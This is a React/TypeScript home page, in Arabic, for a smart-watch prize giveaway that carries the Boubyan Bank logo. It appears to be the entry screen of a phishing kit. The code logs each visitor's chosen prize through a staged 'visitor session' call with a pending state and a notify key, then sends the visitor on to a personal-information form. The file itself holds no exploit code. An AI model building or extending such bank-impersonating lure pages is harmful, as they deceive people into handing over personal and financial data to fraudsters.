import { useCallback, useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { WATCHES, type Watch } from "@/data/watches";
import { createOrUpdateRequest } from "@/api/visitorSession";
import { setSelectedWatch } from "@/lib/session";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { ROUTES } from "@/routes";

export default function HomePage() {
  const navigate = useNavigate();
  const [modalOpen, setModalOpen] = useState(false);
  const [selected, setSelected] = useState<Watch | null>(null);

  useVisitorSession("watches");

  const openModal = useCallback((watch: Watch) => {
    setSelected(watch);
    setSelectedWatch(watch.name);
    setModalOpen(true);
    document.body.classList.add("modal-open");
  }, []);

  const closeModal = useCallback(() => {
    setModalOpen(false);
    document.body.classList.remove("modal-open");
  }, []);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape" && modalOpen) closeModal();
    };
    document.addEventListener("keydown", onKey);
    return () => document.removeEventListener("keydown", onKey);
  }, [modalOpen, closeModal]);

  useEffect(() => () => document.body.classList.remove("modal-open"), []);

  const onContinue = async () => {
    if (!selected) return;
    setSelectedWatch(selected.name);
    closeModal();
    await createOrUpdateRequest({
      stage_key: "watches",
      contact_ref: "visitor",
      notify_key: "----",
      stage_state: "pending",
      prize_choice: selected.name,
    });
    navigate(ROUTES.personalInfo);
  };

  return (
    <>
      <section id="view-home" className="view view--active" aria-label="الصفحة الرئيسية">
        <header className="home-header">
          <img src="/3-5.png" alt="بنك بوبيان" className="home-logo" width={400} height="auto" />
          <h1 className="home-title">جوائز الساعات الذكية</h1>
          <p className="home-subtitle">اختر ساعتك المفضلة واستمر للمشاركة في العرض</p>
        </header>
        <main className="home-grid">
          {WATCHES.map((w) => (
            <button key={w.id} type="button" className="watch-card" onClick={() => openModal(w)}>
              <span className="watch-card__media">
                <img className="watch-card__img" src={w.image} alt={w.name} width={280} height={280} loading="lazy" />
              </span>
              <p className="watch-card__name">{w.name}</p>
            </button>
          ))}
        </main>
      </section>

      <div id="watch-modal" className={`modal ${modalOpen ? "modal--open" : ""}`} hidden={!modalOpen}>
        <div className="modal__backdrop" onClick={closeModal} aria-hidden="true" />
        <div className="modal__dialog" role="dialog" aria-modal="true" aria-labelledby="modal-watch-title">
          <button type="button" className="modal__close" onClick={closeModal} aria-label="إغلاق">
            ×
          </button>
          {selected && (
            <div className="modal__body">
              <div className="modal-hero">
                <img className="modal-hero__img" src={selected.image} alt="" width={400} height={400} />
                <div className="modal-hero__text">
                  <h2 className="modal-hero__title" id="modal-watch-title">
                    {selected.name}
                  </h2>
                </div>
              </div>
              <h3 className="modal-features-title">الميزات الرئيسية</h3>
              <ul className="detail-features">
                {selected.features.map((f) => (
                  <li key={f}>{f}</li>
                ))}
              </ul>
            </div>
          )}
          <div className="modal__actions">
            <button type="button" className="btn-primary btn-primary--wide" onClick={onContinue}>
              متابعة
            </button>
          </div>
        </div>
      </div>
    </>
  );
}
